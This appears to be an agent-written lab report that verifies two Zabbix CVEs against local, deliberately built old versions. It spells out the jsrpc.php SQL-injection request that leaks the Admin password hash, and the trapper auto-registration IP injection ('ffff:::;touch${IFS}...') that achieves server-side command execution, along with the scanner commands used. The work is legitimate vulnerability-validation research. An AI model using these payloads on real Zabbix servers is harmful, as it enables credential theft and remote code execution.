# Old-versions lab verification (3.0.3 / 3.0.30 source builds)

Date: 2026-10-28
Operator: OldStackLab agent
Repo: /home/alex/zabbix_big_project
Lab dir: research/old_versions_lab/ (Dockerfiles, init SQL, compose files)

## Setup

Both Zabbix versions are NOT shipped as official Docker images below 3.0.4 — they
were compiled from source inside Debian jessie (EOL archive):

- Base: `debian:jessie` + archive sources (`http://archive.debian.org/debian/ jessie main`
  with `[trusted=yes]`, `-o Acquire::Check-Valid-Until=false`).
- Build deps: build-essential, libcurl4-openssl-dev, libxml2-dev, libpcre3-dev,
  libssl-dev, libmysqlclient-dev; runtime: apache2, libapache2-mod-php5, php5,
  php5-mysql, php5-gd, php5-ldap, php5-curl, php5-xmlrpc.
- Sources: `https://cdn.zabbix.com/zabbix/sources/oldstable/3.0/zabbix-{VERSION}.tar.gz`
  (the `stable/3.0/` CDN path 404s for EOL versions; `oldstable` works).
- Build: `./configure --enable-server --with-mysql --enable-agent --prefix=/usr/local`
  + top-level `make` (server + get + sender installed), frontend copied to /var/www/html
  with `conf/zabbix.conf.php` (DB MYSQL, user zabbix/zabbix).
- DB: `mysql:5.6` (NOT 8.x — 3.0 uses `users.passwd`, mysql_* PHP driver), schema import
  order 01_schema.sql → 02_images.sql → 03_data.sql (data.sql has FK to images; putting
  data before images fails with error 1452).
- Server config: DBHost=container name, DBName zabbix, DBUser/DBPassword zabbix,
  ListenPort 10051.
- Docker networks own to this lab: `zbx-old-303`, `zbx-old-3030`; containers `zlab_303_*`,
  `zlab_3030_*`.

Image tags: `zlab-old-zabbix:3.0.3`, `zlab-old-zabbix:3.0.30` (same Dockerfile, version
baked literally — ARG is not enough to bust the legacy builder cache, verified image ID
difference 444bad44fc71 vs 48030d82c985).

## CVE-2016-10134 (unauth error-based SQLi, jsrpc.php) — 3.0.3 EXPLOITED

Target: `http://127.0.0.1:18080` (web, container zlab_303_web), apiinfo.version = 3.0.3.

Vector: GET /jsrpc.php `type=0&mode=1&method=screen.get&profileIdx=web.item.graph&
resourcetype=17&profileIdx2=updatexml(0,concat(0x7e,(SELECT ...),0x7e),0)`.
`profileIdx2` flows into `CProfile::update()` → `insertDB()` where it is concatenated
raw into `INSERT INTO profiles (..., idx2) VALUES (..., <payload>)` — the 3.0.3
`insertDB` lacks `zbx_dbstr()` on `idx2`. The MySQL error is rendered on the page:
`Error in query [INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2)
VALUES (2, 2, 'web.item.graph.period', '3600', 2, updatexml(...))] [...]`.

Guest auto-login (userid=2) provides the session needed for `CProfile::flush()`.

Extracted value with default module query (fixed to `passwd` — 3.0 schema column,
not `password`):
```
ok: True
query: SELECT passwd FROM users WHERE userid=1
output: ~5fce1b3e34b520afeffb37ce08c7cd666
```
`5fce1b3e34b520afeffb37ce08c7cd666` = MD5("zabbix") → Admin (userid=1) default password
hash confirmed. Live SQLi → hash disclosure.

Evidence commands:
```
python3 -m zbxscan.cli -m active -t 127.0.0.1:18080 -exp CVE-2016-10134
# -> ok True, output ~5fce1b3e34b520afeffb37ce08c7cd666
```

## CVE-2020-11800 (trapper RCE via auto-registration ip-injection) — 3.0.30 EXPLOITED

Target: trapper `127.0.0.1:18052` → container zlab_3030_server:10051, web 127.0.0.1:18081
(apiinfo.version = 3.0.30).

Auto-registration enabled via SQL after schema/data import:
```sql
INSERT INTO actions (actionid,name,eventsource,evaltype,status,esc_period,def_shortdata,
 def_longdata,recovery_msg,r_shortdata,r_longdata,formula)
VALUES (1000,'Auto registration: Add host',2,0,0,'1h','','',0,'','','');
INSERT INTO operations (operationid,actionid,operationtype,esc_period,esc_step_from,
 esc_step_to,evaltype) VALUES (1000,1000,2,'0',1,1,0);
```
(eventsource=2 = auto-registration, status=0 = enabled, operationtype=2 = "Add host";
mirrors the frontend Configuration→Actions→Auto registration action.)

Exploit (module path B, vulhub-style):
1. Trapper `{"request":"active checks","host":"zbxauto<rand>","ip":"ffff:::;<cmd>"}` —
   `is_ip6()` in 3.0.30 parses `ffff:::` with a dcolon-overflow bug and returns SUCCEED
   for the whole string including the trailing `;cmd`, so the server accepts it.
2. Server registers the unknown host via auto-registration action; the injected string
   is stored unescaped as the host's interface IP (`{HOST.CONN}`).
3. Brute-force `{"request":"command","scriptid":1,"hostid":N}` (scriptid=1 = default
   "Ping": `/bin/ping -c 3 {HOST.CONN} 2>&1`, executes server-side). For the injected
   host, `{HOST.CONN}` expands to `ffff:::;touch${IFS}/tmp/...` → shell executes the
   semicolon command.

Observed:
- Ray-registered host: `hostid 10108 zbxautof5bcef` with interface ip
  `ffff:::;touch${IFS}/tmp/success11800m`.
- Command response: `{"response":"success","data":"ping: unknown host ffff:::\n"}`.
- Marker in the server container (created by uid zabbix):
  ```
  -rw-rw-r-- 1 zabbix zabbix 0 /tmp/success11800m
  -rw-rw-r-- 1 zabbix zabbix 0 /tmp/success11800
  ```
  (two independent runs: host 10106 → success11800, host 10108 → success11800m)

Evidence commands:
```
python3 -m zbxscan.cli -m active -t 127.0.0.1:18052 -exp CVE-2020-11800 \
  --cmd 'touch /tmp/success11800m' --trap-port 18052
# ok True, path trapper, hostname zbxautof5bcef, injection ffff:::;touch${IFS}/tmp/success11800m
sg docker -c "docker exec zlab_3030_server ls -la /tmp/success11800m"
# -rw-rw-r-- 1 zabbix zabbix 0 ... /tmp/success11800m
```

## Module fixes applied (our own zbxscan modules)

- `web.py` Cve201610134: default query `SELECT password FROM users WHERE userid=1`
  → `SELECT passwd FROM users WHERE userid=1` (3.0/2.2 schema column is `passwd`;
  `password` renamed in 4.0+).
- `misc.py` Cve202011800 path B: random hostname per run (`zbxauto<hex>` — autoreg
  only fires for unknown hosts; a fixed name would reuse the existing host and keep the
  old ip), 3s wait for the autoreg action processor, hostid sweep widened to
  10000–10500 (vulhub range; fresh DB templates occupy 10001–10105) and prefers the
  host whose ping output shows the injected `ffff:::` ip.

## Lab artifacts

- research/old_versions_lab/base.Dockerfile, zabbix.Dockerfile, Dockerfile.3.0.3,
  Dockerfile.3.0.30, entrypoint.sh, compose-3.0.3.yml, compose-3.0.30.yml,
  db-3.0.3-init/{01_schema,02_images,03_data}.sql,
  db-3.0.30-init/{01_schema,02_images,03_data,04_autoreg}.sql
